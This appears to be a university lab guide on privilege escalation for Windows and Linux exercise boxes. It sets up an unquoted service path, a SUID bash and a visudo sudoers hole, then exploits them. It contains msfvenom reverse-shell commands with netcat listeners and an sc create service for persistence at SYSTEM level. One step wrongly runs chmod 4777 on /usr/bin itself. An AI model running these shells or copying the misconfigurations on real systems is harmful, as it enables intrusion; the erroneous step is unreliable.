# Security First Principles: Least Privilege Labs
Created for DSU's Cyber Operations I course

| Box Name | Type |
| -------- | ------- |
| Linux Exercises | Kali 2023.3 |
| Windows Exercises | Windows 10 Pro build 19044 |
* Windows Defender is disabled via Group Policy on the Windows Exercises box.

## Lab Exercise 1: Widnows Horizontal/Vertical PrivEsc
### Configuration
#### Horizontal PrivEsc via Unquoted Service Path
1. Add two additional users the box, with different passwords. One should be a standard user and the other should be an administrator. Use the administrator-level user for the following steps.
2. Create a "Step 4" folder on the desktop of the selected user.
3. Create a path in Program Files three folders deep with a dummy service executable (`C:\Program Files\[Level 1 Name]\[Level 2 Name]\[Dummy Service Executable]`).
     * Ensure the `Level 2 Name` contains a space (ex. `Service Run`)
     * This dummy executable won't be used, so pretty much any executable that isn't a shell works. I used `iexplore.exe`.
5. Edit the `Level 1 Name` folder properties to grant all users write permission (Properties > Security > Users > Edit > Write).
6. Create a new registry key in `HKLM\SYSTEM\CurrentControlSet\Services`. This key will be the service name.
7. Add the following values to the key:

    | Name | Type | Data |
    | -------- | ------- | ------- |
    | (Default) | REG_SZ | (value not set) |
    | DisplayName | REG_SZ | [Service Name] |
    | ErrorControl | REG_DWORD | 0x00000001 (1) |
    | ImagePath | REG_EXPAND_SZ | [Path to Dummy Service Executable **without quotes**] |
    | ObjectName | REG_SZ | .\\[User Name] |
    | Start | REG_DWORD | 0x00000002 (2) |
    | Type | REG_DWORD | 0x00000010 (16) |

8. Restart the box.
9. Open the Services MMC snap-in. The `[Service Name]` should appear in the list. Ensure the startup type is set to Automatic so it executes when the box starts.

#### Vertical PrivEsc
1. Temporarily elevate the service created in Horizontal PrivEsc to system (Properties > Log on > Log on as: > Local System account).
2. Get a SYSTEM shell by following the steps in [Horizontal PrivEsc Exploitation](#Horizontal-PrivEsc-via-Unquoted-Service-Path).
3. Create the "Step 6" folder in C:\Windows\System32.
4. Restore the service created in Horizontal PrivEsc to running as the selected user (Properties > Log on > Log on as: > This account: > [select account via Browse and provide password]).

### Exploitation
#### Horizontal PrivEsc via Unquoted Service Path
1. Log on to the second user created in Configuration step 1.
2. Create a simple TCP reverse shell with `msfvenom` on the Linux Exercises box:
      * In the example above, this would be `Service.exe`.
      * There is a preconfigured binary with the IP address of the Linux Exercises box and name `Service.exe` in the Windows PrivEsc folder in the repo. It connects to port 1337.

```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP address of Linux Exercises box> LPORT=1337 -f exe -o [First word of Level 2 Name].exe
```

2. SCP the generated file from the Linux Exercises box to `C:\Program Files\[Level 1 Name]` on the Windows Exercises box.
3. Start a Netcat listener on the Linux Exercises box with `nc -nvlp 1337`.
4. Restart the Windows Exercises box. A Windows shell should spawn in the Netcat session with the permissions of the first user. Use `whoami` to verify this.

#### Vertical PrivEsc
1. Get an administrator shell by following the steps in [Horizontal PrivEsc Exploitation](#Horizontal-PrivEsc-via-Unquoted-Service-Path).
2. Create another simple TCP reverse shell with `msfvenom` on the Linux Exercises box, but it listens on a different port and can use any file name:
      * There is a preconfigured binary with the IP address of the Linux Exercises box and name `Service2.exe` in the Windows PrivEsc folder in the repo. It connects to port 1338.

```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP address of Linux Exercises box> LPORT=1338 -f exe -o [Filename].exe
```

3. SCP the generated file from the Linux Exercises box to the Windows Exercises box. The location is insiginficant.
4. On the administrator shell, create a SYSTEM-level service that runs the file automatically on startup:

```
sc create [ServiceName] binPath= "[C:\Path\To\New\Shell.exe]" start= auto
```

5. Start a Netcat listener on the Linux Exercises box with `nc -nvlp 1338`.
6. Restart the Windows Exercises box. A Windows shell should spawn in the Netcat session with the permissions of SYSTEM. Use `whoami` to verify this.

## Lab Exercise 2: Linux Horziontal PrivEsc via SUID
### Configuration
1. Add two additional users the box, with different passwords. Only one of these users should be allowed to use `sudo`. Use the sudo-enabled user for the following steps.
2. Create a "Step 4" folder on the desktop of the first user.
3. Build the modified Bash shell in the Linux PrivEsc/Lab 2 folder in the repo with `./configure` and `make`. Name it `shell`.
      * This modification always runs the Bash shell in privileged mode (so that the SUID bit won't be [ignored by default](https://www.gnu.org/software/bash/manual/bash.html)).
      * A pre-built `shell` for the Linux Exercises box is also in the folder.
4. Place the `shell` in the `/usr/bin` folder.
5. Set the owner and group (if applicable) and the SUID bit on the file:
      * If set correctly, permissions should be `-rwSrwxrwx` and the user and group will be the first user.

```
chown [first user] /usr/bin
chgrp [first user] /usr/bin
chmod 4777 /usr/bin
chmod u-x /usr/bin
```

### Exploitation
1. Log on to the second user created in Configuration step 1.
2. Execute the `/usr/bin/shell` file. A Bash shell should spawn with the permissions of the first user. Use `whoami` to verify this.

## Lab Exercise 3: Linux Vertical PrivEsc via visudo
### Configuration
1. Using `sudo` as the first user, create a "Step 5" folder in the home directory of the root user.
2. Use `visudo` to edit the `/etc/sudoers` file. Add a line for your second user to allow them to run `visudo` beneath the root user:
      * A preconfigured `/etc/sudoers` file is `sudoers.old` in the Linux PrivEsc/Lab 3 folder in the repo as well.

```
# User privilege specification
root	ALL=(ALL:ALL) ALL
[second user name]	ALL=/usr/sbin/visudo
```

3. Save the file

### Exploitation
1. Run `visudo` as the second user.
2. Append `,/usr/bin/su` to the privilege specifcation for the second user:
      * A preconfigured `/etc/sudoers` file is `sudoers` in the Linux PrivEsc/Lab 3 folder in the repo as well.

```
# User privilege specification
root	ALL=(ALL:ALL) ALL
[second user name]	ALL=/usr/sbin/visudo,/usr/bin/su
```

3. Save the file
4. Run `sudo su` as the second user. A root shell will spawn.

## Puzzler: Correcting PrivEsc Vulnerabilities
